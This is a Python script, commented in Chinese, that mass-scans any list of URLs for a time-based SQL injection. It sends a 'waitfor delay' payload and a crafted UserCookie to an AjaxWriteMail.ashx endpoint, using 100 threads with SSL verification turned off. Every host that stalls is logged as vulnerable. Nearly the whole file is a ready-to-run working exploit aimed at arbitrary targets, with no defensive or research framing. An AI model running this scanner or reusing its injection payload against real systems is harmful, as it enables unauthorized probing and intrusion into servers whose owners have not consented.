import requests
import threading
import time
import urllib3
from urllib.parse import urlparse, urlunparse
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import os
from tqdm import tqdm

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class URLScanner:
    def __init__(self, thread_count=100):
        self.thread_count = thread_count
        self.lock = threading.Lock()
        self.vulnerable_urls = []
        self.completed_count = 0
        self.total_urls = 0
        
    def normalize_url(self, url):
        """规范化URL格式"""
        url = url.strip()
        
        # 去除末尾的斜杠
        if url.endswith('/'):
            url = url[:-1]
            
        # 添加协议头（如果没有）
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        return url
    
    def check_vulnerability(self, url, pbar):
        """检查单个URL是否存在漏洞"""
        try:
            # 规范化URL
            normalized_url = self.normalize_url(url)
            
            # 构造完整的请求URL
            target_url = f"{normalized_url}/m/Dingding/Ajax/AjaxWriteMail.ashx"
            
            # 请求头
            headers = {
                'Host': urlparse(normalized_url).netloc,
                'Cookie': 'UserCookie={"empId":"SQLI_POC","corpId": "1"}',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            # 请求数据
            data = "method=updateLastedContactTable&mails=1'waitfor delay'0:0:3'-- -"
            
            # 记录开始时间
            start_time = time.time()
            
            # 发送POST请求，禁用SSL验证
            response = requests.post(
                target_url,
                headers=headers,
                data=data,
                verify=False,
                timeout=10  # 设置超时时间
            )
            
            # 计算响应时间
            response_time = time.time() - start_time
            
            # 更新进度条
            with self.lock:
                self.completed_count += 1
                pbar.update(1)
                pbar.set_description(f"Scanning: {normalized_url[:30]:<30}")
                pbar.set_postfix(
                    vuln_count=len(self.vulnerable_urls),
                    current_time=f"{response_time:.2f}s"
                )

            # 检查漏洞条件：状态码200且响应时间>=3秒
            if response.status_code == 200 and response_time >= 3.0:
                result = {
                    'url': normalized_url,
                    'status_code': response.status_code,
                    'response_time': round(response_time, 2),
                    'target_url': target_url
                }
                return result
            else:
                return None
                
        except requests.exceptions.Timeout:
            with self.lock:
                self.completed_count += 1
                pbar.update(1)
                pbar.set_description(f"Timeout: {url[:30]:<30}")
            return None
        except requests.exceptions.RequestException as e:
            with self.lock:
                self.completed_count += 1
                pbar.update(1)
                pbar.set_description(f"Error: {url[:30]:<30}")
            return None
        except Exception as e:
            with self.lock:
                self.completed_count += 1
                pbar.update(1)
                pbar.set_description(f"Error: {url[:30]:<30}")
            return None
    
    def save_result(self, result):
        """保存漏洞结果到文件"""
        with self.lock:
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"[+] Vulnerable URL Found:\n")
                f.write(f"    URL: {result['url']}\n")
                f.write(f"    Target: {result['target_url']}\n")
                f.write(f"    Status Code: {result['status_code']}\n")
                f.write(f"    Response Time: {result['response_time']}s\n")
                f.write(f"    Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("-" * 50 + "\n")
    
    def scan_urls(self, urls):
        """扫描URL列表"""
        print(f"[*] Starting scan with {self.thread_count} threads...")
        print(f"[*] Total URLs to scan: {len(urls)}")
        
        # 清空结果文件
        if os.path.exists('result.txt'):
            os.remove('result.txt')
        
        # 创建进度条
        with tqdm(total=len(urls), desc="Initializing", unit="url", 
                 bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}] {postfix}") as pbar:
            
            with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
                # 提交所有任务
                future_to_url = {executor.submit(self.check_vulnerability, url, pbar): url for url in urls}
                
                # 处理完成的任务
                for future in concurrent.futures.as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        result = future.result()
                        if result:
                            print(f"\n[VULNERABLE] {result['url']} - Response time: {result['response_time']}s")
                            self.save_result(result)
                            self.vulnerable_urls.append(result)
                    except Exception as e:
                        # 异常已经在check_vulnerability中处理，这里不需要重复处理
                        pass
        
        # 输出扫描总结
        print(f"\n[*] Scan completed!")
        print(f"[*] Total vulnerable URLs found: {len(self.vulnerable_urls)}")
        print(f"[*] Results saved to: result.txt")

def main():
    # 检查URL文件是否存在
    if not os.path.exists('url.txt'):
        print("[ERROR] url.txt file not found!")
        print("Please create url.txt file with one URL per line.")
        return
    
    # 读取URL列表
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = f.readlines()
        
        # 过滤空行和注释
        urls = [url.strip() for url in urls if url.strip() and not url.strip().startswith('#')]
        
        if not urls:
            print("[ERROR] No URLs found in url.txt!")
            return
            
        print(f"[*] Loaded {len(urls)} URLs from url.txt")
        
    except Exception as e:
        print(f"[ERROR] Failed to read url.txt: {str(e)}")
        return
    
    # 创建扫描器并开始扫描
    scanner = URLScanner(thread_count=100)
    scanner.scan_urls(urls)

if __name__ == "__main__":
    print("SQL Injection Vulnerability Scanner")
    print("=" * 40)
    main()